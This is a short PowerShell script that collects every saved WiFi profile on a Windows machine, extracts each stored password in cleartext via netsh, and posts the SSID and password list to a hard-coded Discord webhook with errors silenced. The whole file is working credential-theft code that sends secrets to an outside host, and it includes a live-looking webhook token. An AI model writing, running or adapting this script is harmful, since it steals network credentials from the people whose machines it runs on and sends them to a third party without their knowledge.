$WebhookUrl = "https://discord.com/api/webhooks/1526592454168416286/85IrB-28a1gF4qRZOceA2tQNWpPEHa7KmBLUMSPVC0VENE6W7P1jsENuvZoepNtkARJB"

Write-Host "Getting WiFi"

$profiles = netsh wlan show profiles | 
    Select-String "\s*:\s*(.*)$" | 
    ForEach-Object { $_.Matches.Groups[1].Value.Trim() } | 
    Where-Object { $_ -ne "" -and $_ -notmatch "All User Profile" }

$wifiList = foreach ($profile in $profiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear
    
    $password = $profileDetails | 
                Select-String "Key Content\s*:\s*(.*)$" | 
                ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

    if (-not $password) { $password = "[None or Open Network]" }

    [PSCustomObject]@{
        SSID     = $profile
        Password = $password
    }
}

# Chunking logic for Discord API size limit
$MaxChunkSize = 1900
$CurrentChunk = ""

Write-Host "Sending to webhook"

foreach ($chunk in $wifiList | ConvertTo-Json) {
    if (($CurrentChunk.Length + $chunk.Length + 1) -gt $MaxChunkSize) {
        if ($CurrentChunk.Trim() -ne "") {
            $Payload = @{ content = $CurrentChunk } | ConvertTo-Json
            $Response = Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType "application/json" -ErrorAction SilentlyContinue
        }
        $CurrentChunk = $chunk + "`n"
    } else {
        $CurrentChunk += $chunk + "`n"
    }
}

if ($CurrentChunk.Trim() -ne "") {
    $Payload = @{ content = $CurrentChunk } | ConvertTo-Json
    $Response = Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType "application/json" -ErrorAction SilentlyContinue
}

Write-Host "done."
